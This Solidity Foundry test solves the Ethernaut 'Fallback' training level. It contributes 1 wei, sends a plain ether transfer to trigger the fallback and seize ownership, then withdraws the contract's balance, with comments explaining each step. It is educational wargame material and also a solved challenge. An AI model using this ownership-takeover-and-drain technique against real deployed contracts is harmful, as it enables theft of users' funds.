pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/Ethernaut.sol";
import "ethernaut/contracts/levels/FallbackFactory.sol";

contract FallbackExploit is DSTest {
	Vm private vm = Vm(address(HEVM_ADDRESS));
	Ethernaut private ethernaut;
	address private eoaAddress = address(1337);

	function setUp() public {
		ethernaut = new Ethernaut();
		vm.deal(eoaAddress, 1 ether);
	}

	function testExploit() public {
		// Setting up the level
		FallbackFactory factory = new FallbackFactory();
		ethernaut.registerLevel(factory);
		vm.startPrank(eoaAddress);
		address levelAddress = ethernaut.createLevelInstance(factory);
		Fallback target = Fallback(payable(levelAddress));

		// TODO: Exploit the contract
		// Here, we'll need to trigger the fallback function to claim the ownership of the contract
		// It's also possible to contribute to the contract more than the owner did to claim the
		// ownership (> 1000 ether), but that's a lot of ether!

		// 1. Contribute to the contract the smallest amount possible
		target.contribute{value: 1 wei}();
		assertEq(target.contributions(eoaAddress), 1 wei);

		// 2. Trigger the fallback function by:
		// - Calling a function that doesn't exist inside the contract, or
		// - Calling a function without passing the required data, or
		// - Sending ether without any data to the contract
		emit log_named_address("Fallback contract owner", target.owner());
		// solhint-disable-next-line avoid-low-level-calls
		(bool success, ) = payable(address(target)).call{value: 1 wei}("");
		assertTrue(success);
		assertEq(target.owner(), eoaAddress);
		emit log_named_address("New Fallback contract owner", target.owner());
		emit log_named_address("Exploiter address", eoaAddress);

		// 3. Withdraw all the funds from the contract
		emit log_named_uint("Fallback contract balance", address(target).balance);
		target.withdraw();
		emit log_named_uint("New Fallback contract balance", address(target).balance);

		// Submit the solution
		bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
		vm.stopPrank();
		assert(levelSuccessfullyPassed);
	}
}
